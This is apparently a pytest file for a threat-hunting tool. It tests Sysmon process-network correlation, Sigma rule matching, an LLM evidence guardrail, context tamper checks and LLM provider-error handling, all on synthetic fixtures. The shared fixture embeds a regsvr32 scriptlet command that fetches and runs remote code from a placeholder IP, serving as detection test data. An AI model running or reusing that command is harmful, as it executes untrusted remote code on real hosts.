"""Source-contract and safety checks; synthetic fixtures, no real LLM requests."""
from copy import deepcopy
import json

import pytest
import yaml

from threat_hunting.evidence.process_network import correlate_process_network
from threat_hunting.evaluation.evidence_contract_v2 import assess_integrated_evidence_gate
from threat_hunting.evaluation.experimental_comparison import generate_branch
from threat_hunting.llm.config import LLMConfig
from threat_hunting.llm.client import LLMProviderError
from threat_hunting.llm.guardrail import HallucinationGuardrail
from threat_hunting.llm.schema import ThreatHuntingReport
from threat_hunting.sigma.process_offline import evaluate_process_rule
from threat_hunting.graphrag.query_scope import assess_query_scope


def row(ref, eid="1", image="regsvr32.exe", guid="guid-one", process_id="10", timestamp="2020-01-01T00:00:01Z", **fields):
    event={"event_id":eid,"provider":"Microsoft-Windows-Sysmon","host":"fixture-host","process_name":image,
           "process_guid":guid,"process_id":process_id,"parent_process_name":"powershell.exe","parent_process_id":"1",
           "parent_process_guid":"parent-guid","command_line":"regsvr32 /i:http://192.0.2.1/x.sct /n scrobj.dll",
           "timestamp":timestamp,**fields}
    return {"source_file":"fixture.jsonl","raw_record_ref":ref,"canonical_fields":event,"original_fields":{"OriginalFileName":"REGSVR32.EXE"}}


def test_guid_network_join_and_pid_reuse_boundary():
    creates=[row("creation"),row("reuse",image="another.exe",guid="guid-two",timestamp="2020-01-01T00:00:03Z")]
    nets=[row("network-ok","3",timestamp="2020-01-01T00:00:02Z",destination_ip="192.0.2.1",destination_port=80),
          row("network-old-guid-after-reuse","3",timestamp="2020-01-01T00:00:04Z"),
          row("network-pid-reuse-image-conflict","3",guid=None,timestamp="2020-01-01T00:00:04Z")]
    result=correlate_process_network(creates+nets)
    assert len(result['connections'])==1
    assert len(result['unresolved_connections'])==2
    assert result['connections'][0]['basis']=='host_guid_lifetime'


def test_guid_conflicting_host_or_image_is_not_joined():
    result=correlate_process_network([row('create'),row('n1','3',host='other-host'),row('n2','3',image='unrelated.exe')])
    assert result['connections']==[] and len(result['unresolved_connections'])==2


def test_ambiguous_pid_lifetime_not_arbitrarily_selected():
    result=correlate_process_network([row('a',guid='one'),row('b',guid='two'),row('n','3',guid=None,timestamp='2020-01-01T00:00:02Z')])
    assert result['connections']==[]
    assert any(link['kind']=='network' for link in result['ambiguous_links'])


def test_security_sysmon_views_are_paired_once():
    security=row('security','4688',guid=None,provider='Microsoft-Windows-Security-Auditing',timestamp='2020-01-01T00:00:01.02Z')
    result=correlate_process_network([row('sysmon'),security])
    assert len(result['processes'])==1 and len(result['processes'][0]['observations'])==2
    assert result['processes'][0]['correlation_status']=='inferred'


def test_pid_fallback_is_age_bounded_and_exit_stops_join():
    result=correlate_process_network([row('create'),row('old','3',guid=None,timestamp='2020-01-01T00:03:01Z')])
    assert result['connections']==[]
    result=correlate_process_network([row('create'),row('exit','5',timestamp='2020-01-01T00:00:02Z'),row('after','3',timestamp='2020-01-01T00:00:03Z')])
    assert result['connections']==[]


def sigma_rule(tmp_path, detection):
    path=tmp_path/'fixture.yml'
    path.write_text(yaml.safe_dump({'title':'Synthetic rule','id':'fixture','logsource':{'category':'process_creation','product':'windows'},'detection':detection}),encoding='utf-8')
    return path


def test_sigma_filter_and_missing_exclusion_are_not_silently_matches(tmp_path):
    path=sigma_rule(tmp_path,{'selection':{'Image|endswith':'regsvr32.exe'},'filter_main_legitimate':{'CommandLine|contains':'legitimate'},'condition':'selection and not 1 of filter_main_*'})
    rows=[row('match'),row('filtered',command_line='legitimate'),row('unknown',command_line=None)]
    result=evaluate_process_rule(path,rows)
    assert [r['raw_record_ref'] for r in result['matches']]==['match']
    assert [r['raw_record_ref'] for r in result['indeterminate']]==['unknown']
    assert result['process_creation_observations_examined']==3


@pytest.mark.parametrize('detection',[{'selection':{'Image|re':'.*'},'condition':'all of selection_*'},
                                      {'selection':{'Image':'x'},'condition':'selection | count() > 3'},
                                      {'selection':{'UnknownField':'x'},'condition':'all of selection*'}])
def test_sigma_unsupported_semantics_fail_closed(tmp_path,detection):
    with pytest.raises(ValueError): evaluate_process_rule(sigma_rule(tmp_path,detection),[])


def context_with_fields(*,cti=False):
    fields={'event_id':'4625','host':'fixture-host','timestamp':'2020-01-01T00:00:01Z'}
    original={'EventID':4625,'TargetUserName':'fixture-account','WorkstationName':'fixture-source','Status':'0xc000006d','SubStatus':'0xc000006a'}
    props={'source_observations':[{'source_file':'fixture.jsonl','raw_record_ref':'jsonl:line:1','canonical_fields':fields,'original_fields':original}]}
    if cti: props.update(evidence_layer='cti_context',publisher='Synthetic publisher')
    chunk={'chunk_id':'fixture-chunk','chunk_type':'cti_report' if cti else 'fact','scenario_id':'fixture','source':{'object_type':'entity' if cti else 'fact','object_id':'fixture-object','json_pointer':'/entities/0' if cti else '/facts/0'},
           'status':'candidate' if cti else 'observed','source_references':[{'source_file':'fixture.jsonl','raw_record_ref':'jsonl:line:1'}],'content':'Synthetic fields only','metadata':props}
    return {'scenario_id':'fixture','source_ground_truth':{'scenario_id':'fixture','sha256':'1'*64},'retrieval':{'hits':[{'chunk':chunk}]},'traversal':{}}


def report(**changes):
    return ThreatHuntingReport(verdict='INSUFFICIENT_EVIDENCE',executive_summary='',technical_analysis='',**changes)


def test_authentication_guardrail_accepts_only_bound_source_account_action():
    step={'step_number':1,'source_entity':'fixture-source','action':'authentication_failure','target_entity':'fixture-account','evidence_ref':'jsonl:line:1','timestamp':'2020-01-01T00:00:01Z'}
    guard=HallucinationGuardrail(strict=True)
    assert guard.validate(report(attack_chain=[step]),context_with_fields()).is_valid
    step['source_entity']='fixture-account'
    assert not guard.validate(report(attack_chain=[step]),context_with_fields()).is_valid
    step['source_entity']='fixture-source'
    step['target_entity']='another-account'
    assert not guard.validate(report(attack_chain=[step]),context_with_fields()).is_valid


def test_cti_citation_exists_but_cannot_witness_local_authentication():
    c=context_with_fields(cti=True)
    guard=HallucinationGuardrail(strict=True)
    assert guard.validate(report(evidence_refs=['fixture-object']),c).is_valid
    step={'step_number':1,'source_entity':'fixture-source','action':'authentication_failure','target_entity':'fixture-account','evidence_ref':'fixture-object'}
    assert not guard.validate(report(attack_chain=[step]),c).is_valid
    legacy={'policy_id':'fixture','stage_results':{'topical_relevance':{'status':'passed','reason_codes':[]}}}
    gate,_=assess_integrated_evidence_gate('Những tài khoản nào đăng nhập thất bại 4625?',c,legacy)
    assert gate['decision']=='abstain'


def test_scope_recognizes_vietnamese_questions_without_case_ids():
    for query in ['Vì sao mshta.exe sinh powershell.exe đáng điều tra?', 'Đối chiếu authentication telemetry với CTI Microsoft.', 'PowerShell Get-Service sysmon có hoàn tất thành công không?']:
        assert assess_query_scope(query,corpus={'chunks':[{'metadata':{'process_name':'mshta.exe'}}]},graph={})['decision']=='proceed'


def test_assessment_confidence_and_source_status_are_different_fields():
    c=context_with_fields(); chunk=c['retrieval']['hits'][0]['chunk']
    chunk['chunk_type']='mitre_assessment';chunk['status']='candidate'
    chunk['metadata']={'external_id':'T1110.003','stix_id':'attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c','name':'Password Spraying','evidence_support':'supported_by_observed_behavior','status':'candidate','review_status':'needs_review'}
    good={'technique_id':'T1110.003','technique_name':'Password Spraying','confidence':'supported_by_observed_behavior','assessment_status':'candidate','evidence_support':'supported_by_observed_behavior','rationale':'Synthetic supported suspicion'}
    assert HallucinationGuardrail().validate(report(mitre_mappings=[good]),c).is_valid
    good['assessment_status']='confirmed'
    assert not HallucinationGuardrail().validate(report(mitre_mappings=[good]),c).is_valid
    good['assessment_status']='candidate'
    good['confidence']='confirmed'
    assert not HallucinationGuardrail().validate(report(mitre_mappings=[good]),c).is_valid


def test_packing_lossless_tamper_detection_and_guardrail_equivalence():
    from threat_hunting.retrieval.context_packing import pack_context,unpack_context
    original=context_with_fields()
    original['retrieval']['hits'].append(deepcopy(original['retrieval']['hits'][0]))
    packed=pack_context(original)
    assert unpack_context(packed)==original and len(packed['source_observation_catalog'])==1
    step={'step_number':1,'source_entity':'fixture-source','action':'authentication_failure','target_entity':'fixture-account','evidence_ref':'jsonl:line:1'}
    guard=HallucinationGuardrail()
    assert guard.validate(report(attack_chain=[step]),original).is_valid==guard.validate(report(attack_chain=[step]),packed).is_valid
    key=next(iter(packed['source_observation_catalog']))
    packed['source_observation_catalog'][key]['original_fields']['TargetUserName']='tampered'
    with pytest.raises(ValueError,match='tampered'):unpack_context(packed)


@pytest.mark.parametrize('status',[401,403,429])
def test_one_request_no_retry_fallback_and_stop_on_auth_or_rate_limit(status):
    calls=[]
    class Fake:
        def __init__(self,**kw): self.last_attempt_count=0
        def generate(self,messages):
            calls.append(messages);self.last_attempt_count=1
            raise LLMProviderError(status)
    emitted={}
    result,stop=generate_branch([],{},LLMConfig(api_key='synthetic-fixture'),Fake,lambda name,value:emitted.update({name:value}))
    assert len(calls)==result['llm_http_attempts']==1
    assert stop==f'provider_http_{status}'
    assert result['outcome'] in {'provider_error','rate_limited'}
